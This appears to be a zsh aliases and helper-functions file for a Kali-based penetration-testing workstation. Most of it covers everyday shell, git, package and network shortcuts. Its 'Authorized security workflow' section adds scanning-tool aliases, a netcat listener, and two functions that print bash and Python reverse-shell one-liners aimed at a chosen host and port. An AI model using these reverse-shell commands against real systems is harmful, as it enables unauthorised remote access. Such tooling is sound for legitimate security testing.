# BadAssKali aliases and helpers. This file is managed by the installer.

#################################
# Terminal sanity (nano/vi/tmux)
#################################

# Unknown TERM (e.g. xterm-ghostty over SSH or on a fresh box) breaks nano/vi/tmux.
if [[ -n "$TERM" ]] && (( $+commands[infocmp] )) && ! infocmp "$TERM" >/dev/null 2>&1; then
    export TERM=xterm-256color
fi

if [[ -z "$EDITOR" ]]; then
    if (( $+commands[nvim] )); then export EDITOR=nvim
    elif (( $+commands[vim] )); then export EDITOR=vim
    else export EDITOR=nano; fi
    export VISUAL="$EDITOR"
fi

# Plain `vi` runs in vi-compatible mode (broken arrows/backspace); use vim.
if (( $+commands[nvim] )); then alias vi='nvim' vim='nvim'
elif (( $+commands[vim] )); then alias vi='vim'; fi

#################################
# Navigation and files
#################################

alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias .....='cd ../../../..'
alias c='clear'
alias cls='clear'
alias md='mkdir -p'
alias rd='rmdir'
alias home='cd "$HOME"'
alias downloads='cd "$HOME/Downloads"'
alias desktop='cd "$HOME/Desktop"'
alias htb='cd "$HOME/htb-boxes"'
alias notes='cd "$HOME/notes"'
alias tools='cd "$HOME/tools"'
alias screenshots='cd "$HOME/screenshots"'
alias wordlists='cd /usr/share/seclists'

if (( $+commands[eza] )); then
    alias ls='eza --icons=auto --group-directories-first'
    alias l='eza -lah --icons=auto --group-directories-first'
    alias ll='eza -lah --git --icons=auto --group-directories-first'
    alias la='eza -a --icons=auto --group-directories-first'
    alias lt='eza --tree --level=2 --icons=auto --group-directories-first'
    alias lt3='eza --tree --level=3 --icons=auto --group-directories-first'
else
    alias l='ls -lah'
    alias ll='ls -lah'
    alias la='ls -A'
fi

if (( $+commands[batcat] )); then
    alias cat='batcat --paging=never'
    alias bat='batcat'
elif (( $+commands[bat] )); then
    alias cat='bat --paging=never'
fi

alias grep='grep --color=auto'
alias diff='diff --color=auto'
alias duh='du -h --max-depth=1 | sort -h'
alias biggest='du -ah . 2>/dev/null | sort -rh | head -n 20'
alias recent='find . -type f -printf "%TY-%Tm-%Td %TT %p\n" | sort -r | head -n 30'

#################################
# System and packages
#################################

alias path='print -l ${(s.:.)PATH}'
alias disk='df -hT'
alias mem='free -h'
alias cpu='lscpu'
alias psg='ps aux | grep -v grep | grep -i'
alias ports='ss -tulpn'
alias listening='sudo ss -lntup'
alias services='systemctl --type=service --state=running'
alias failed-services='systemctl --failed'
alias logs='journalctl -xe'
alias bootlogs='journalctl -b -p warning'
alias reload='exec zsh'
alias zshrc='${EDITOR:-nvim} "$HOME/.zshrc"'
alias aliases='${EDITOR:-nvim} "$HOME/.config/badasskali/aliases.zsh"'
alias update-fonts='fc-cache -fv'

if (( $+commands[apt] )); then
    alias aptu='sudo apt update'
    alias aptup='sudo apt update && sudo apt full-upgrade'
    alias apti='sudo apt install'
    alias aptr='sudo apt remove'
    alias apts='apt search'
    alias aptclean='sudo apt autoremove --purge && sudo apt clean'
fi

#################################
# Network and internet
#################################

alias ips='ip -brief address'
alias routes='ip route'
alias arp='ip neigh'
alias pubip='curl -fsSL https://api.ipify.org; echo'
alias headers='curl -sSI'
alias weather='curl -fsSL "https://wttr.in/?format=3"'
alias dnsflush='sudo resolvectl flush-caches'
alias pingg='ping -c 4 8.8.8.8'
alias pingdns='ping -c 4 1.1.1.1'
alias trace='traceroute'
alias speed='curl -fsSL https://speed.cloudflare.com/__down?bytes=100000000 -o /dev/null -w "%{speed_download}\n"'
alias wifi='nmcli device wifi list'
alias connections='nmcli connection show'

dns() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: dns <domain> [record-type]" >&2
        return 2
    fi
    dig +short "$1" "${2:-A}"
}

myip() {
    curl -fsSL https://ipinfo.io/json
}

#################################
# Development and data
#################################

alias py='python3'
alias pip='python3 -m pip'
alias venv='python3 -m venv .venv'
alias activate='source .venv/bin/activate'
alias web='python3 -m http.server 8000'
alias json='jq .'
alias yaml='yq .'
alias svim='sudo -E ${EDITOR:-nvim}'
alias edit='${EDITOR:-nvim}'
alias shellcheck-all='find . -type f -name "*.sh" -print0 | xargs -0 shellcheck'
alias serve='python3 -m http.server'
alias bench='hyperfine'
alias cheat='tldr'
alias cheatsheet='tldr'

mkcd() {
    [[ $# -eq 1 ]] || { echo "Usage: mkcd <directory>" >&2; return 2; }
    mkdir -p -- "$1" && builtin cd -- "$1"
}

timer() {
    [[ $# -eq 1 && "$1" =~ ^[0-9]+[smhd]?$ ]] \
        || { echo "Usage: timer <duration, e.g. 25m>" >&2; return 2; }
    sleep "$1"
    printf '\aTimer finished: %s\n' "$1"
}

backup() {
    [[ $# -gt 0 ]] || { echo "Usage: backup <file-or-directory> [...]" >&2; return 2; }
    local item stamp
    stamp="$(date +%Y%m%d-%H%M%S)"
    for item in "$@"; do
        [[ -e "$item" ]] || { echo "Not found: $item" >&2; continue; }
        cp -a -- "$item" "${item}.${stamp}.bak"
        echo "Created ${item}.${stamp}.bak"
    done
}

extract() {
    [[ $# -eq 1 ]] || { echo "Usage: extract <archive>" >&2; return 2; }
    [[ -f "$1" ]] || { echo "Not a file: $1" >&2; return 1; }

    case "$1" in
        *.tar.gz|*.tgz) tar -xzf "$1" ;;
        *.tar.bz2|*.tbz2) tar -xjf "$1" ;;
        *.tar.xz|*.txz) tar -xJf "$1" ;;
        *.tar.zst) tar --zstd -xf "$1" ;;
        *.tar) tar -xf "$1" ;;
        *.zip) unzip "$1" ;;
        *.7z) 7z x "$1" ;;
        *.rar) unrar x "$1" ;;
        *.gz) gunzip "$1" ;;
        *.bz2) bunzip2 "$1" ;;
        *.xz) unxz "$1" ;;
        *) echo "Unsupported archive: $1" >&2; return 1 ;;
    esac
}

#################################
# Git
#################################

alias g='git'
alias gs='git status --short --branch'
alias gl='git log --oneline --decorate --graph --all -20'
alias gla='git log --oneline --decorate --graph --all'
alias gd='git diff'
alias gds='git diff --staged'
alias ga='git add'
alias gaa='git add --all'
alias gc='git commit'
alias gcm='git commit -m'
alias gca='git commit --amend'
alias gb='git branch'
alias gsw='git switch'
alias gswc='git switch -c'
alias gco='git checkout'
alias gp='git push'
alias gpf='git push --force-with-lease'
alias gpu='git pull --rebase'
alias gf='git fetch --all --prune'
alias gr='git remote -v'
alias gst='git stash push'
alias gstp='git stash pop'
alias gclean='git clean -nd'

#################################
# Containers and tmux
#################################

alias ta='tmux attach -t'
alias tls='tmux list-sessions'
alias tnew='tmux new-session -s'
alias tkill='tmux kill-session -t'
alias dockerps='docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"'
alias dcu='docker compose up -d'
alias dcd='docker compose down'
alias dcl='docker compose logs -f'
alias dcb='docker compose build'

#################################
# Authorized security workflow
#################################

alias nse='ls /usr/share/nmap/scripts | less'
alias nmap-fast='nmap -T4 -F'
alias nmap-default='nmap -sC -sV'
alias nmap-full='nmap -p- --min-rate 1000'
alias nmap-udp='sudo nmap -sU --top-ports 100'
alias nmap-vuln='nmap --script vuln'
alias rustscan='rustscan --ulimit 5000'
alias rs='rustscan'
alias nxc='netexec'
alias bh='bloodhound'
alias ferox='feroxbuster'
alias gob='gobuster'
alias fuzz='ffuf'
alias httpx='httpx-toolkit'
alias certipy-find='certipy find'
alias certipy-auth='certipy auth'
alias certipy-shadow='certipy shadow'
alias hashes='hashid'
alias pcap='wireshark'
alias burp='burpsuite'

listen() {
    [[ $# -eq 1 && "$1" =~ ^[0-9]+$ ]] \
        || { echo "Usage: listen <port>" >&2; return 2; }
    nc -lvnp "$1"
}

revbash() {
    [[ $# -eq 2 && "$2" =~ ^[0-9]+$ ]] \
        || { echo "Usage: revbash <host> <port>" >&2; return 2; }
    printf 'bash -i >& /dev/tcp/%s/%s 0>&1\n' "$1" "$2"
}

revpython() {
    [[ $# -eq 2 && "$2" =~ ^[0-9]+$ ]] \
        || { echo "Usage: revpython <host> <port>" >&2; return 2; }
    printf "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'\n" "$1" "$2"
}

# Optional alias packs enabled through `badasskali aliases enable <pack>`.
_badasskali_alias_dir="${XDG_CONFIG_HOME:-$HOME/.config}/badasskali"
if [[ -r "$_badasskali_alias_dir/enabled-alias-packs" ]]; then
    while IFS= read -r _badasskali_alias_pack; do
        [[ -n "$_badasskali_alias_pack" && "$_badasskali_alias_pack" != \#* ]] || continue
        [[ -r "$_badasskali_alias_dir/alias-packs/${_badasskali_alias_pack}.zsh" ]] \
            && source "$_badasskali_alias_dir/alias-packs/${_badasskali_alias_pack}.zsh"
    done < "$_badasskali_alias_dir/enabled-alias-packs"
fi
unset _badasskali_alias_dir _badasskali_alias_pack
